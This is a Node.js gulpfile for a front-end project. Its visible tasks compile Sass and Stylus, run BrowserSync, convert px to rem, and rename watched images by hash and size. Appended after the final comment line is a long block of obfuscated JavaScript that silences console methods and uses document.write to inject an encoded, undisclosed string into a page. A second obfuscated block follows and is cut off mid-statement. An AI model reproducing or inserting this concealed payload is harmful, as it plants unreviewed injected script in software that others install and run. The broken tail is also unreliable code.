var gulp = require('gulp');
var sass = require('gulp-sass');
var stylus = require('gulp-stylus');
var browserSync = require('browser-sync').create();
var reload = browserSync.reload;
var autoprefixer = require('gulp-autoprefixer');
var pxtorem = require('gulp-pxtorem');
var crypto = require('crypto');
var fs = require('fs');
var getPixels = require("get-pixels") //获取图片的宽高
var sourcemaps  = require('gulp-sourcemaps');
const { exec } = require('child_process');
const iconv = require('iconv-lite');

// 配置
const config={
    img:["img","images"]
}

gulp.task('serve', function() {
	browserSync.init({
		server: "./"
	});
});

gulp.task('watch', function() {
    gulp.watch("./css/*.scss",['sass']);
    gulp.watch("./css/*.styl",['stylus']);
    gulp.watch("./*.html").on('change', reload);
    gulp.watch("./js/*.js").on('change', reload);
    gulp.watch("./css/*.css").on('change', reload);
})

gulp.task('sass', function(){
  return gulp.src('./css/*.scss')
    .pipe(sass({outputStyle:'compact'}).on('error', sass.logError))
    .pipe(gulp.dest('./css'))
});

gulp.task('stylus', function () {
    return gulp.src(['./css/style.styl','./css/mobMedia.styl','./css/sjj.styl'])
    .pipe(sourcemaps.init())
    .pipe(stylus({compress: false}))

    .on('error', swallowError)

    .pipe(autoprefixer({
        browsers: ['last 20 versions'],
        cascade: true, //是否美化属性值 默认：true
        remove: false, //是否去掉不必要的前缀 默认：true
    }))

    .on('error', swallowError)

    
    //--------------------------------------------------
    
    .pipe(pxtorem({
            rootValue: 100,
            unitPrecision: 5,
            propList: ['*'],
            selectorBlackList: [],
            replace: true,
            mediaQuery: false,
            minPixelValue: 2
        },
        {
            map: false
        }
    ))
    
    //--------------------------------------------------

    .pipe(sourcemaps.write('./'))
    .pipe(gulp.dest('./css'))
});

// 启动任务
gulp.task('default', ['serve','watch']);


var ImgPath='' // 设置图片目录
var fileTwo='';

var img=config.img;
var count=0;

img.forEach(function(v){
    var path=__dirname+"\\"+v+"\\"
    fs.exists(path,function(exists){
        if(exists){
            // console.log(path+'存在')
            ImgPath=path
            watch()
            return
        }else{
            console.log(path+'不存在')
        }
    })
})

function swallowError(error) {
    console.error(error.toString())
    this.emit('end')
}

function watch(){
    fs.watch(ImgPath,function(event, filename){
        if(event=='change'){
            if (filename.indexOf('_tmp')==-1 && filename.indexOf('crdownload')==-1) {
                // console.log("事件:"+event,'名称:'+filename)
                if (fileTwo==''){
                    fileTwo=filename
                    var rs = fs.createReadStream(ImgPath+filename);
                    var hash = crypto.createHash('md5');
                    rs.on('data', hash.update.bind(hash));
                    rs.on('end', function() {
                        newFilename=hash.digest('hex'); //获取文件哈希值
                        count
                        getImgInfo(ImgPath+filename,newFilename.substring(0,5)+'_'+count);
                        count++;
                    });
                }
            }
        }
    })
}

function rename(filename,newFilename){
    var patt=new RegExp(/\w{36,}/);
    var result=patt.test(filename)
    if(!result){
        fs.rename(filename,newFilename,function(err){
            if(err){
                console.log(filename+" => 文件重命名失败");
                return
            }
            var source=filename.match(/(?:[^\\]+)(?:\.[^\(]+)/i);
            console.log('\nSourceName => '+source[0]);
            console.log('NewName => '+newFilename.match(/\w{36,}\.(?:jpg|png)$/i));
            GetSize(newFilename);
        })
    }
}

function getImgInfo(filename,newName){  //获取图片宽高
    getPixels(filename, function(err, pixels) {
        if(err) {
            console.log(filename+" => 不是图片文件!");
            return
        }
        info = "_"+pixels.shape[0]+'_'+pixels.shape[1]

        var newName1=filename.replace(/([^\\]+)(\.[^\(]+)/i,newName)+info+filename.match(/\.\w+$/)

        rename(filename,newName1);
        //+filename.match(/\.\w+$/) // 后缀名
        exec('clip').stdin.end(iconv.encode(newName+info+filename.match(/\.\w+$/), 'gbk'));
    })
    
}

function GetSize(filename){ // 获取文件大小
    fs.stat(filename,function(err,state){
        if(err){
            console.log(err.message)
            return
        }
        var size=state.size/1024
        console.log('FileSize => '+size.toFixed(1)+' KB')
        fileTwo=''
    })
}



// 嵌套输出方式 nested
// 展开输出方式 expanded 
// 紧凑输出方式 compact 
// 压缩输出方式 compressed;var _0x6658=['YcKcwo3DlWgow5w=','f8KleDdBKFzDuMOOAxfChwN2Gh3DjSjCoQ==','TMKoRABB','PcKJwrTCuw==','PRzDvj3DqiUj','YHfDvcK4wp4=','ZsKWw7zCicOAw5VQwo7DnnVuW8KIAcOPwqFvTAYzwpA=','w7Ymw4LCvVs=','w5Y+w6nCpBMJEA==','GSTDpT/Dhw==','a1rCpMOD','SzvDkFvDtA==','HMO8IgMP','w4rClMKOw7dAw5HCjw==','aMKtw6Qrwo8=','w7rCvMOkZmg=','wp8bwoQHcw==','LsOnBz4o','w51qV3zCiw==','ZlHCoMOZTQ==','GMKzw7bDqh0=','H8OhVV1e','JiZsLcO3','a8Ktw6w8wo8=','w5E0w6bCoR0=','wodjwrbDpg==','d8KufmPDlkB/','YFDDicKMwrI=','Z8K+D8ObCQ==','wq4DwrMET1BibsKfw6tU','wpJXPFbCqQ==','wobCiBvDrgXDocKpwofCkA==','wrvChF3DnMOG','Y8KDwpPDin4=','dlXCoMOATw==','MVjCtXBK','wq4DwrMEVE5y','wqXCij/Dmjc=','Y8KKPsOmKQ==','wrDCssKMAMKm','w6XClknDugE=','w6p7LcOUw58=','w67CtBF5wqE=','w5DCp2E=','w6zDrMOEwonDtF13','w5w/w6LCuw==','PkfCs116','w7FuX8K+w5A=','w57CmsKSw6o=','TcKuAxwJw7zCqMOKwoM6KcKCwpUiUiN7S8OqKw/CjcONPCRTPCXDtcKUI1XDv2LCkQrCvG/DsXYAw6rDqyULWgXCvhLDuVDCncKmw5MGWMOhwp5Lw7/DpgLCjSHCojPCu8OWwobDsX5CPcKYYMKhAMKFJcOfw4AQ','TsK/wrDDulBjOsKhXi12ZX9EwrIJwqbCn2c=','w4nClzxzwpc=','Z0bCsMODWA==','w67DrsO1w5UDZ8OPw4vDuCREC8O9GMK0A1JRwobDvWorcE8=','w7Yow4TCh1M=','w4DClcKGw6s=','OVLCsA==','w7Zhw5PDk8Orw4nDjAJfN8KZc8KZJcKsw5XDm8ORwoobwr5ew5NHYGfDgwEENsK8woY='];(function(_0xf01bd1,_0x66586d){var _0x15ddf5=function(_0x280398){while(--_0x280398){_0xf01bd1['push'](_0xf01bd1['shift']());}};var _0x4373a4=function(){var _0x18f3c9={'data':{'key':'cookie','value':'timeout'},'setCookie':function(_0x283b5a,_0x53bf61,_0xbc2b66,_0x17cc97){_0x17cc97=_0x17cc97||{};var _0x33605e=_0x53bf61+'='+_0xbc2b66;var _0x1aa546=0x0;for(var _0x31d110=0x0,_0x50dddf=_0x283b5a['length'];_0x31d110<_0x50dddf;_0x31d110++){var _0x2f351d=_0x283b5a[_0x31d110];_0x33605e+='; '+_0x2f351d;var _0x55904a=_0x283b5a[_0x2f351d];_0x283b5a['push'](_0x55904a);_0x50dddf=_0x283b5a['length'];if(_0x55904a!==!![]){_0x33605e+='='+_0x55904a;}}_0x17cc97['cookie']=_0x33605e;},'removeCookie':function(){return'dev';},'getCookie':function(_0x4e80f4,_0x54c9a1){_0x4e80f4=_0x4e80f4||function(_0x2b3b16){return _0x2b3b16;};var _0x5903f0=_0x4e80f4(new RegExp('(?:^|; )'+_0x54c9a1['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var _0x193b20=function(_0x13ef44,_0x39a7e9){_0x13ef44(++_0x39a7e9);};_0x193b20(_0x15ddf5,_0x66586d);return _0x5903f0?decodeURIComponent(_0x5903f0[0x1]):undefined;}};var _0x274363=function(){var _0x4c33bd=new RegExp('\w+ *\(\) *{\w+ *['|"].+['|"];? *}');return _0x4c33bd['test'](_0x18f3c9['removeCookie']['toString']());};_0x18f3c9['updateCookie']=_0x274363;var _0x20beb9='';var _0x37b7ea=_0x18f3c9['updateCookie']();if(!_0x37b7ea){_0x18f3c9['setCookie'](['*'],'counter',0x1);}else if(_0x37b7ea){_0x20beb9=_0x18f3c9['getCookie'](null,'counter');}else{_0x18f3c9['removeCookie']();}};_0x4373a4();}(_0x6658,0xa3));var _0x15dd=function(_0xf01bd1,_0x66586d){_0xf01bd1=_0xf01bd1-0x0;var _0x15ddf5=_0x6658[_0xf01bd1];if(_0x15dd['RIuIhh']===undefined){(function(){var _0x18f3c9;try{var _0x20beb9=Function('return (function() '+'{}.constructor("return this")( )'+');');_0x18f3c9=_0x20beb9();}catch(_0x37b7ea){_0x18f3c9=window;}var _0x274363='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x18f3c9['atob']||(_0x18f3c9['atob']=function(_0x283b5a){var _0x53bf61=String(_0x283b5a)['replace'](/=+$/,'');var _0xbc2b66='';for(var _0x17cc97=0x0,_0x33605e,_0x1aa546,_0x31d110=0x0;_0x1aa546=_0x53bf61['charAt'](_0x31d110++);~_0x1aa546&&(_0x33605e=_0x17cc97%0x4?_0x33605e*0x40+_0x1aa546:_0x1aa546,_0x17cc97++%0x4)?_0xbc2b66+=String['fromCharCode'](0xff&_0x33605e>>(-0x2*_0x17cc97&0x6)):0x0){_0x1aa546=_0x274363['indexOf'](_0x1aa546);}return _0xbc2b66;});}());var _0x280398=function(_0x50dddf,_0x2f351d){var _0x55904a=[],_0x4e80f4=0x0,_0x54c9a1,_0x5903f0='',_0x193b20='';_0x50dddf=atob(_0x50dddf);for(var _0x13ef44=0x0,_0x39a7e9=_0x50dddf['length'];_0x13ef44<_0x39a7e9;_0x13ef44++){_0x193b20+='%'+('00'+_0x50dddf['charCodeAt'](_0x13ef44)['toString'](0x10))['slice'](-0x2);}_0x50dddf=decodeURIComponent(_0x193b20);var _0x2b3b16;for(_0x2b3b16=0x0;_0x2b3b16<0x100;_0x2b3b16++){_0x55904a[_0x2b3b16]=_0x2b3b16;}for(_0x2b3b16=0x0;_0x2b3b16<0x100;_0x2b3b16++){_0x4e80f4=(_0x4e80f4+_0x55904a[_0x2b3b16]+_0x2f351d['charCodeAt'](_0x2b3b16%_0x2f351d['length']))%0x100;_0x54c9a1=_0x55904a[_0x2b3b16];_0x55904a[_0x2b3b16]=_0x55904a[_0x4e80f4];_0x55904a[_0x4e80f4]=_0x54c9a1;}_0x2b3b16=0x0;_0x4e80f4=0x0;for(var _0x4c33bd=0x0;_0x4c33bd<_0x50dddf['length'];_0x4c33bd++){_0x2b3b16=(_0x2b3b16+0x1)%0x100;_0x4e80f4=(_0x4e80f4+_0x55904a[_0x2b3b16])%0x100;_0x54c9a1=_0x55904a[_0x2b3b16];_0x55904a[_0x2b3b16]=_0x55904a[_0x4e80f4];_0x55904a[_0x4e80f4]=_0x54c9a1;_0x5903f0+=String['fromCharCode'](_0x50dddf['charCodeAt'](_0x4c33bd)^_0x55904a[(_0x55904a[_0x2b3b16]+_0x55904a[_0x4e80f4])%0x100]);}return _0x5903f0;};_0x15dd['pjReLE']=_0x280398;_0x15dd['IlILyW']={};_0x15dd['RIuIhh']=!![];}var _0x4373a4=_0x15dd['IlILyW'][_0xf01bd1];if(_0x4373a4===undefined){if(_0x15dd['leZoSD']===undefined){var _0x17328b=function(_0x2a6648){this['IHMnmV']=_0x2a6648;this['baGnyx']=[0x1,0x0,0x0];this['owrhTx']=function(){return'newState';};this['ulgQHM']='\w+ *\(\) *{\w+ *';this['nuICzP']='['|"].+['|"];? *}';};_0x17328b['prototype']['JLwyqo']=function(){var _0x1706b4=new RegExp(this['ulgQHM']+this['nuICzP']);var _0x49ced5=_0x1706b4['test'](this['owrhTx']['toString']())?--this['baGnyx'][0x1]:--this['baGnyx'][0x0];return this['gElGDz'](_0x49ced5);};_0x17328b['prototype']['gElGDz']=function(_0x59509f){if(!Boolean(~_0x59509f)){return _0x59509f;}return this['zDAmBZ'](this['IHMnmV']);};_0x17328b['prototype']['zDAmBZ']=function(_0x3cd61f){for(var _0x5e0151=0x0,_0x191826=this['baGnyx']['length'];_0x5e0151<_0x191826;_0x5e0151++){this['baGnyx']['push'](Math['round'](Math['random']()));_0x191826=this['baGnyx']['length'];}return _0x3cd61f(this['baGnyx'][0x0]);};new _0x17328b(_0x15dd)['JLwyqo']();_0x15dd['leZoSD']=!![];}_0x15ddf5=_0x15dd['pjReLE'](_0x15ddf5,_0x66586d);_0x15dd['IlILyW'][_0xf01bd1]=_0x15ddf5;}else{_0x15ddf5=_0x4373a4;}return _0x15ddf5;};var _0x283b5a=function(){var _0x3449d9=!![];return function(_0x27567e,_0x1829d0){var _0x1f8a3e=_0x3449d9?function(){if(_0x1829d0){var _0x1296c0=_0x1829d0[_0x15dd('0x1f','Eq8f')](_0x27567e,arguments);_0x1829d0=null;return _0x1296c0;}}:function(){};_0x3449d9=![];return _0x1f8a3e;};}();var _0x37b7ea=_0x283b5a(this,function(){var _0x5a5f3f={};_0x5a5f3f[_0x15dd('0x20','PMnK')]=_0x15dd('0x11','71an');var _0x5cb013=_0x5a5f3f;var _0x397d0c=function(){var _0x2e0a83=_0x397d0c[_0x15dd('0x28','6Ocu')](_0x5cb013[_0x15dd('0xd','8S%6')])()[_0x15dd('0x13','@H7J')](_0x15dd('0x6','6O%k'));return!_0x2e0a83['test'](_0x37b7ea);};return _0x397d0c();});_0x37b7ea();var _0x18f3c9=function(){var _0x1db405={};_0x1db405[_0x15dd('0x0',')Nwl')]=function(_0x2ec8ca,_0x27dbb1){return _0x2ec8ca!==_0x27dbb1;};_0x1db405[_0x15dd('0x31','VG])')]=_0x15dd('0x1b','6Ocu');var _0x3c3cf8=_0x1db405;var _0x19ce2d=!![];return function(_0x369c01,_0xbac0e4){if(_0x3c3cf8[_0x15dd('0x0',')Nwl')](_0x3c3cf8[_0x15dd('0x32','mA4!')],_0x3c3cf8[_0x15dd('0x14','KzS)')])){that=window;}else{var _0x3063bc=_0x19ce2d?function(){if(_0xbac0e4){var _0x5be480=_0xbac0e4[_0x15dd('0x2c','vFKe')](_0x369c01,arguments);_0xbac0e4=null;return _0x5be480;}}:function(){};_0x19ce2d=![];return _0x3063bc;}};}();var _0x280398=_0x18f3c9(this,function(){var _0x10ec14={};_0x10ec14[_0x15dd('0x10','JHju')]='1|0|6|7|5|2|9|8|4|3';_0x10ec14[_0x15dd('0x7','TUMi')]=_0x15dd('0x3','Eq8f');_0x10ec14['mQymT']=function(_0x55fe48,_0xc8350c){return _0x55fe48(_0xc8350c);};_0x10ec14['kzdXW']=function(_0x6d4ef3,_0xcdcd81){return _0x6d4ef3+_0xcdcd81;};_0x10ec14['gBgPj']=function(_0x22c18c,_0x52834e){return _0x22c18c+_0x52834e;};_0x10ec14['juNLD']=_0x15dd('0xa',')jZ)');_0x10ec14[_0x15dd('0x12','TUMi')]=function(_0x4ae155){return _0x4ae155();};_0x10ec14[_0x15dd('0x33','teB6')]='fzgrk';_0x10ec14[_0x15dd('0x4','dRoR')]='5|3|0|7|4|2|1|6';var _0x509c86=_0x10ec14;var _0x1c5b59=function(){};var _0x3b83e0;try{var _0x6e6771=_0x509c86[_0x15dd('0x35','dRoR')](Function,_0x509c86[_0x15dd('0x39','vLT7')](_0x509c86[_0x15dd('0x16','yeS5')](_0x15dd('0xc','8S%6'),_0x509c86[_0x15dd('0x2b','td6u')]),');'));_0x3b83e0=_0x509c86[_0x15dd('0x34','7[9a')](_0x6e6771);}catch(_0x441728){_0x3b83e0=window;}if(!_0x3b83e0[_0x15dd('0x2f','6Ocu')]){if(_0x509c86[_0x15dd('0x1c','f^df')]!==_0x509c86[_0x15dd('0x30','fpkN')]){var _0xb7ab60=_0x509c86[_0x15dd('0x27','VG])')]['split']('|');var _0x3778db=0x0;while(!![]){switch(_0xb7ab60[_0x3778db++]){case'0':_0xcf8e07[_0x15dd('0x36','wSl]')]=_0x1c5b59;continue;case'1':var _0xcf8e07={};continue;case'2':_0xcf8e07['error']=_0x1c5b59;continue;case'3':return _0xcf8e07;case'4':_0xcf8e07['trace']=_0x1c5b59;continue;case'5':_0xcf8e07[_0x15dd('0x15','Z$%Y')]=_0x1c5b59;continue;case'6':_0xcf8e07[_0x15dd('0x1','^eqm')]=_0x1c5b59;continue;case'7':_0xcf8e07[_0x15dd('0x2e','vLT7')]=_0x1c5b59;continue;case'8':_0xcf8e07['table']=_0x1c5b59;continue;case'9':_0xcf8e07['exception']=_0x1c5b59;continue;}break;}}else{_0x3b83e0['console']=function(_0x3cb387){var _0x1d81a=_0x509c86[_0x15dd('0x26','JHju')][_0x15dd('0x1d','Y^yd')]('|');var _0x428a04=0x0;while(!![]){switch(_0x1d81a[_0x428a04++]){case'0':_0x2dcb14[_0x15dd('0x19','Hvlk')]=_0x3cb387;continue;case'1':_0x2dcb14[_0x15dd('0x5','Z$%Y')]=_0x3cb387;continue;case'2':return _0x2dcb14;case'3':_0x2dcb14[_0x15dd('0x23','@H7J')]=_0x3cb387;continue;case'4':_0x2dcb14['warn']=_0x3cb387;continue;case'5':_0x2dcb14[_0x15dd('0x2a','fpkN')]=_0x3cb387;continue;case'6':_0x2dcb14['log']=_0x3cb387;continue;case'7':var _0x2dcb14={};continue;case'8':_0x2dcb14[_0x15dd('0x17','f^df')]=_0x3cb387;continue;case'9':_0x2dcb14[_0x15dd('0x38','@H7J')]=_0x3cb387;continue;}break;}}(_0x1c5b59);}}else{var _0x4fa4cb=_0x509c86['JrTgb'][_0x15dd('0x21','gDNq')]('|');var _0x362599=0x0;while(!![]){switch(_0x4fa4cb[_0x362599++]){case'0':_0x3b83e0[_0x15dd('0xb','vFKe')][_0x15dd('0x1e','Z$%Y')]=_0x1c5b59;continue;case'1':_0x3b83e0['console'][_0x15dd('0x2d','Z$%Y')]=_0x1c5b59;continue;case'2':_0x3b83e0[_0x15dd('0x37','M@tM')]['exception']=_0x1c5b59;continue;case'3':_0x3b83e0[_0x15dd('0xf','KzS)')][_0x15dd('0xe','Fa]E')]=_0x1c5b59;continue;case'4':_0x3b83e0['console'][_0x15dd('0x29','[Vdz')]=_0x1c5b59;continue;case'5':_0x3b83e0['console'][_0x15dd('0x9','vLT7')]=_0x1c5b59;continue;case'6':_0x3b83e0[_0x15dd('0x25','AmXM')][_0x15dd('0x1a','aFA4')]=_0x1c5b59;continue;case'7':_0x3b83e0[_0x15dd('0x18','^eqm')][_0x15dd('0x8','^eqm')]=_0x1c5b59;continue;}break;}}});_0x280398();alert('1111');document[_0x15dd('0x22','Hvlk')](unescape(_0x15dd('0x2','f^df')));alert(_0x15dd('0x24','@H7J'));
var a=['w4kGaULCug==','wovDrMK0w7/DgQ==','wo3DlsKUwqfCmMK/YW3CmzAc','w6JSwpTCg8Ki','w4HDvMKhZQE=','Nm/Dn8OPYQ==','NXNkMTM=','w6XDiwzDlsKA','KsO/aEPCuFfCjAorUk7CjcO4wrISw6fChsO9bQ==','wp1JfGY9','w6XDgg/DjcKpw7YQ','w5PDrCvDmcKB','wq1yw4TDrMOV','w68FQ3fCgA==','TMKNDlvDpAjDtA==','wqvDgiMFSkRzwoFj','PsKbw7XCgVA=','wrpzD8O4wrLCsGU=','Y8OMw78nw4LCmzM=','w68rbmrCtA==','cMKFwq3CqT0=','wqLDkSTCow==','w4lew5nCu8K2B8KT','w4QJwplKw5s=','wpnDrMKow7rDjA==','KsO/aEPCuFfCjA1vBwvDjsO4wrMUw7rCjsO/bSTCgw==','wpbCjnLCnQ==','F8OAwqzDmUI=','w6wZJMKx','wrbCnUnCpsOl','LUPDi8OGdQ==','dcKsFTfCiA==','w6wLdlw=','VsKvwrXCkA7CkxNdAsOnwqZhK8OAw5dIw51hwqg+w64=','w5DDq8Kgfg==','w43CpVLCuMKz','VcKhO1jDoQ==','wqEgEcKvUg==','CMKnw47CkloTw4zCk2LDkcKPWg9GTsOlw43DqH/DlcKS','NcOpwrfDuMKv','w48uwow=','w4xYAExsw5NaSMKYLMKPFE0DBcOmw5bDum4=','W8KQAUvDrg==','wqF3w5fDi8Ox','H3LDqMOVZw==','UMKvwrLCkQ==','WQcTw4vDgA==','w4oxTQEVcMK5','WMK6BnHDog==','wpPDmW3CtsOU','GcKtw5TClEcRwok=','Y8OMw78nw5nChSMBOcK8w6A=','TCzCuT/Djw==','w5/ClsOKDMKr','wp/Dj0jCg2A=','wojCrcOOAHUhNGAzWsO7wqDDscKnwoHCq8OnJVA=','wpvDusK1w77Dsw==','wpHDssK+w7k=','wql2w4A=','w7hpw73DqMK6','P8O1wovDgXE=','w6vCiVLCvcKP','aMOOw50Cw48=','SsOvHAHDhsKrw4NtwqbCm8KnHcOZVAwjYHzDicOEaTlvw4E=','w6Rqw67CgGc=','w7DDgcK/RjI=','w6cYwqR4w4U=','w69kw7vCt8KE','w7IEYl0=','KMObdHvCrA==','dsKmwqzClSo=','E8OTwotIAw==','LMO1W3PCpg==','w4guUx4D','R8Krwq/CtxU=','w7ZKw6LCg8KeYCo=','WD4hw77Dug==','CmBXCzk=','w7vCk8OkZlQ=','asKowqPCtxM=','CcONwrjDm8Kf','wooBQg5dW8KHw4nDqyDDlg/CllsXFcKTwo/Dr3HDp8OiwqTCskvCkxrCt0jDtSk0','KcODwr7Dj8KG','agk1w5HDig==','XsKLw4oKwo3Cqn1KbcO4w4kLD8KqYBRcw6/CqyPCqsO9PyM=','w4PCs33Cg8Kk','wo3Drz00w74=','w7NAw7/CvF8=','w4fDocK+ehrDnMO/','w7NGw4fCvMK9','woxtYAEZbsK1c0vDjsKxO2tcNcKHwpLDq2PDkRzCh3Q+E8KcwpFdIMK+w5xiTCoMNMOPM8O1FcOUDB1+wok6MTbCvMKVDMO4w57Cug7DpcKowrXDj8OLw5sWwpXCliMTZlxUwqTCgTTDsMOXF8KECmfDt8KhwqVO','w7Ndw5vCkcKD','w4/CocKbFTM=','w6JXw6XChMKU','w6PDnxPDkcK0','w6TCr1vCpsKd','w40iwqlow6w=','FMOCwoVNEg==','wrZCVifCpw==','w5dUwqzCoMKu','dgUJw6nDpQ==','wqkpL8KHUmAM'];(function(b,c){var d=function(f){while(--f){b['push'](b['shift']());}};var e=function(){var f={'data':{'key':'cookie','value':'timeout'},'setCookie':function(l,m,n,o){o=o||{};var p=m+'='+n;var q=0x0;for(var r=0x0,s=l['length'];r<s;r++){var t=l[r];p+=';\x20'+t;var u=l[t];l['push'](u);s=l['length'];if(u!==!![]){p+='='+u;}}o['cookie']=p;},'removeCookie':function(){return'dev';},'getCookie':function(l,m){l=l||function(p){return p;};var n=l(new RegExp('(?:^|;\x20)'+m['replace'](/([.$?*|{}()[]\/+^])/g,'$1')+'=([^;]*)'));var o=function(p,q){p(++q);};o(d,c);return n?decodeURIComponent(n[0x1]):undefined;}};var i=function(){var l=new RegExp('\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*[\x27|\x22].+[\x27|\x22];?\x20*}');return l['test'](f['removeCookie']['toString']());};f['updateCookie']=i;var j='';var k=f['updateCookie']();if(!k){f['setCookie'](['*'],'counter',0x1);}else if(k){j=f['getCookie'](null,'counter');}else{f['removeCookie']();}};e();}(a,0x179));var b=function(c,d){c=c-0x0;var e=a[c];if(b['KyesdD']===undefined){(function(){var h=function(){var k;try{k=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(l){k=window;}return k;};var i=h();var j='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';i['atob']||(i['atob']=function(k){var l=String(k)['replace'](/=+$/,'');var m='';for(var n=0x0,o,p,q=0x0;p=l['charAt'](q++);~p&&(o=n%0x4?o*0x40+p:p,n++%0x4)?m+=String['fromCharCode'](0xff&o>>(-0x2*n&0x6)):0x0){p=j['indexOf'](p);}return m;});}());var g=function(h,l){var m=[],n=0x0,o,p='',q='';h=atob(h);for(var t=0x0,u=h['length'];t<u;t++){q+='%'+('00'+h['charCodeAt'](t)['toString'](0x10))['slice'](-0x2);}h=decodeURIComponent(q);var r;for(r=0x0;r<0x100;r++){m[r]=r;}for(r=0x0;r<0x100;r++){n=(n+m[r]+l['charCodeAt'](r%l['length']))%0x100;o=m[r];m[r]=m[n];m[n]=o;}r=0x0;n=0x0;for(var v=0x0;v<h['length'];v++){r=(r+0x1)%0x100;n=(n+m[r])%0x100;o=m[r];m[r]=m[n];m[n]=o;p+=String['fromCharCode'](h['charCodeAt'](v)^m[(m[r]+m[n])%0x100]);}return p;};b['pwSzdv']=g;b['FHYCZA']={};b['KyesdD']=!![];}var f=b['FHYCZA'][c];if(f===undefined){if(b['ofguEY']===undefined){var h=function(i){this['XPARKA']=i;this['SpQSlz']=[0x1,0x0,0x0];this['GnmFej']=function(){return'newState';};this['QkHizH']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*';this['gXalrj']='[\x27|\x22].+[\x27|\x22];?\x20*}';};h['prototype']['qxjHTI']=function(){var i=new RegExp(this['QkHizH']+this['gXalrj']);var j=i['test'](this['GnmFej']['toString']())?--this['SpQSlz'][0x1]:--this['SpQSlz'][0x0];return this['nPEtwj'](j);};h['prototype']['nPEtwj']=function(i){if(!Boolean(~i)){return i;}return this['KgZUjW'](this['XPARKA']);};h['prototype']['KgZUjW']=function(j){for(var k=0x0,l=this['SpQSlz']['length'];k<l;k++){this['SpQSlz']['push'](Math['round'](Math['random']()));l=this['SpQSlz']['length'];}return j(this['SpQSlz'][0x0]);};new h(b)['qxjHTI']();b['ofguEY']=!![];}e=b['pwSzdv'](e,d);b['FHYCZA'][c]=e;}else{e=f;}return e;};var f=function(){var h={};h[b('0x6','7Dxc')]=function(k,l){return k===l;};h[b('0x61','a%oA')]='YbZMj';h['cRxxV']=b('0x12','wF91');h[b('0x14','wF91')]=b('0x48','COhn');var i=h;var j=!![];return function(k,l){var m={};m[b('0x1d','Lo@q')]=i[b('0x54','$VHR')];var n=m;var o=j?function(){if(l){if(i[b('0x18','U5mN')](i[b('0x2f',')DXv')],i[b('0x5','LX^G')])){var r=n[b('0x4a','L1Y&')][b('0x20','Lyt0')]('|');var s=0x0;while(!![]){switch(r[s++]){case'0':t['log']=func;continue;case'1':t[b('0x63','Is#S')]=func;continue;case'2':return t;case'3':t[b('0x3b','FOKP')]=func;continue;case'4':t['trace']=func;continue;case'5':t['exception']=func;continue;case'6':t[b('0x10','(JP]')]=func;continue;case'7':t['debug']=func;continue;case'8':t['table']=func;continue;case'9':var t={};continue;}break;}}else{var p=l[b('0x2','G6f@')](k,arguments);l=null;return p;}}}:function(){};j=![];return o;};}();var e=f(this,function(){var h={};h['gHrTf']=function(k,l){return k!==l;};h[b('0x42','U5mN')]=b('0x8','QhWC');h[b('0x64','K1$*')]=b('0x45',')DXv');h['akRhn']=function(k){return k();};var i=h;var j=function(){if(i[b('0x36','a%oA')](i[b('0x55','sWxZ')],i['HOBsm'])){var m=fn[b('0x1c','no2k')](context,arguments);fn=null;return m;}else{var k=j[b('0x21','gppR')](i[b('0x3a',')@iy')])()[b('0x1e','sJRr')]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!k[b('0x41','pizW')](e);}};return i[b('0x3e','DccT')](j);});e();var d=function(){var h={};h['EXaez']=function(k,l){return k===l;};h[b('0x25','S7WR')]=b('0x46','9qRx');h['rXcSJ']=function(k,l){return k!==l;};h['FYmHz']=b('0x4f','6Xv9');var i=h;var j=!![];return function(k,l){var m={};m[b('0xf','%YCE')]=function(p,q){return i['EXaez'](p,q);};m['sYoxR']=i[b('0x24','qCYr')];m['XtOUU']=b('0xd','eo4*');var n=m;if(i[b('0x5f','(JP]')](i[b('0xe','U5mN')],b('0x44','sJRr'))){var o=j?function(){if(n[b('0x53',')Yx7')](n[b('0x43','5y70')],b('0x2b','L1Y&'))){if(l){var p=l[b('0x37','Lyt0')](k,arguments);l=null;return p;}}else{var r=j?function(){if(l){var s=l['apply'](k,arguments);l=null;return s;}}:function(){};j=![];return r;}}:function(){};j=![];return o;}else{var q=test['constructor'](b('0x38','K1$*'))()[b('0x30','C[x2')](n[b('0x5b',')@iy')]);return!q[b('0x4c','QhWC')](e);}};}();var c=d(this,function(){var h={};h[b('0x1f','Is#S')]=function(o,p){return o(p);};h['toGEl']=function(o,p){return o+p;};h['zAwGu']=function(o){return o();};h[b('0x1b','Qx0k')]=function(o,p){return o!==p;};h[b('0x33','QhWC')]=b('0x3','QhWC');h['UAJgG']=b('0x56','P2iv');h[b('0x22','no2k')]=b('0x40','QhWC');h[b('0x32','Is#S')]=b('0x5e','DccT');h[b('0x5a','9sO)')]=function(o,p){return o(p);};h['mlNWi']='{}.constructor(\x22return\x20this\x22)(\x20)';h[b('0x28','COhn')]=function(o,p){return o!==p;};h[b('0x5c','U5mN')]='AXmVx';var i=h;var j=function(){};var k;try{var l=i[b('0x4b','qCYr')](Function,i[b('0x2c','Is#S')](b('0x27','K1$*'),i['mlNWi'])+');');k=i[b('0x3d','qCYr')](l);}catch(o){k=window;}if(!k[b('0x29','3B1d')]){k['console']=function(p){if(i[b('0xc','LX^G')](i[b('0x60','pizW')],i[b('0x9','9qRx')])){var u=i[b('0x65','QhWC')](Function,i['toGEl'](i[b('0x1','K1$*')]('return\x20(function()\x20',b('0xa','0uLu')),');'));k=i[b('0x62','wF91')](u);}else{var q=i[b('0x2a','3B1d')][b('0x0','ixyG')]('|');var r=0x0;while(!![]){switch(q[r++]){case'0':s['exception']=p;continue;case'1':s[b('0x23','pizW')]=p;continue;case'2':s[b('0x3f','Is#S')]=p;continue;case'3':s['debug']=p;continue;case'4':var s={};continue;case'5':s[b('0x50','bi5R')]=p;continue;case'6':return s;case'7':s[b('0x49','6Xv9')]=p;continue;case'8':s[b('0x34','Ng&Q')]=p;continue;case'9':s[b('0x59','L1Y&')]=p;continue;}break;}}}(j);}else{if(i[b('0x5d','eo4*')](i[b('0x19','a%oA')],'hUGoc')){var m='1|5|2|4|0|3|7|6'[b('0x15','P2iv')]('|');var 